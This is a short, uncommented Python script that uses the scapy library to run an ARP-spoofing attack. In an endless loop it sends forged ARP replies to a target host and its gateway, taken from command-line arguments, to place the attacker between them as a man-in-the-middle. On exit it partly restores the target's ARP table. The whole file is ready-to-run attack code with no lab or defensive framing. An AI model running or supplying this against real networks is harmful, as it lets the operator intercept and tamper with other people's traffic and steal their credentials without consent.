from scapy.all import *
import time
import sys

conf.verb = 0
gateway_ip = sys.argv[1]  
gateway_mac = sys.argv[2]
target_ip = sys.argv[3]
target_mac = sys.argv[4]
def main():
    try:
        print("[*] Start ARPspoofing...")
        poison_target(target_ip,target_mac,gateway_ip,gateway_mac)
    except KeyboardInterrupt:
        pass
    finally:
        time.sleep(2)
        restore_table(gateway_ip,gateway_mac,target_ip,target_mac)
        sys.exit(0)

def poison_target(target_ip,target_mac,gateway_ip,gateway_mac):
    poisoning_target = Ether(dst=target_mac)/ARP()
    poisoning_target.op = 2
    poisoning_target.psrc = gateway_ip
    poisoning_target.pdst = target_ip

    poisoning_gateway = Ether(dst=gateway_mac)/ARP()
    poisoning_gateway.op = 2
    poisoning_gateway.psrc = target_ip
    poisoning_gateway.pdst = gateway_ip

    while True:
        sendp(poisoning_target)
        sendp(poisoning_gateway)
        time.sleep(5)
    print ("[*] Finished.")
    return

def restore_table(gateway_ip,gateway_mac,target_ip,target_mac):
    print ("[*] Restoring target.")
    send(ARP(op=1,psrc=gateway_ip,hwsrc=gateway_mac,pdst=target_ip,hwdst=target_mac),count=3)

if __name__=="__main__":
    main()